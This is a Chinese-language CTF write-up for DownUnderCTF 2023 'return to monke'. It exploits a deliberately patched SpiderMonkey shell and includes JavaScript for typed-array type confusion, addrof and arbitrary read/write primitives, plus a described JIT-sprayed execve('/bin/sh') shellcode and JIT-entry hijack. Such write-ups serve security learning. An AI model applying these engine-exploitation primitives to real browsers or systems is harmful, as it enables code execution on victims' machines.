# DownUnderCTF 2023 return to monke Writeup

## 题目简述

题目提供定制 SpiderMonkey shell 和源码补丁。补丁新增 `Object.prototype.monke`：无参数时把 JS 对象内存的第一个 64 位值按 double 返回，有参数时又把传入 double 的位模式直接写回对象头。`os` 等便捷 shell 接口被移除，目标是从对象头破坏构造任意读写并执行 JIT 中的机器码。

## 解题过程

危险实现的核心等价于：

```cpp
uint64_t *raw_obj = reinterpret_cast<uint64_t *>(&*obj);
if (argc == 0) {
    return bits_to_double(raw_obj[0]);
}
raw_obj[0] = double_to_bits(argument);
```

这个首 qword 含有引擎解释对象布局时使用的内部指针。创建相邻的 `BigUint64Array` 和 `Uint8Array` 后，把前者的首 qword 复制给后者：

```javascript
let wide = new BigUint64Array(64);
let confused = new Uint8Array(64);
confused.monke(wide.monke());
```

类型混淆后的 `confused` 产生 64 位越界索引。官方构建的堆布局中，索引 15 对应辅助 `BigUint64Array rdw` 的 elements 指针，索引 41 对应对象数组的 elements 指针。

把对象数组的 elements 临时装到 `rdw`，即可把对象引用读成原始地址；把任意地址写入 `rdw.elements`，即可读写该地址：

```javascript
function addrof(object) {
  let saved = confused[15];
  confused[15] = confused[41];
  objects[0] = object;
  let address = rdw[0] & 0xffffffffffffn;
  confused[15] = saved;
  return address;
}

function read64(address) {
  let saved = confused[15];
  confused[15] = address;
  let value = rdw[0];
  confused[15] = saved;
  return value;
}

function write64(address, value) {
  let saved = confused[15];
  confused[15] = address;
  rdw[0] = value;
  confused[15] = saved;
}
```

`pwn` 函数返回的一组浮点常量，其位模式包含 `execve("/bin/sh",0,0)` shellcode 和 `0xdeadbeef` 标记。先调用一百万次让 SpiderMonkey 生成 JIT 代码，再从函数对象偏移 `0x28` 取得 JIT 元数据和代码地址，扫描标记定位 shellcode。最后把 JIT 入口改为 shellcode 地址并再次调用 `pwn()`。

获得 shell 后读取随机文件名匹配的 `*_flag.txt`：

```text
DUCTF{y0uVe_r3tuRn3d_to_m0nkE_nOW_reJ3ct_hUm4Nity_38216b3ff7e281554c9d8eced68d3357}
```

## 方法总结

补丁直接把 JavaScript 数字变成对象头任意写，破坏了 GC、类型和内存布局的全部不变量。利用先将它收敛成 typed-array 越界访问，再构造 `addrof` 和任意读写，最后劫持 JIT 入口。引擎题中应严格以具体 commit 和构建偏移为准，不能把 SpiderMonkey 的对象布局套用到 V8。
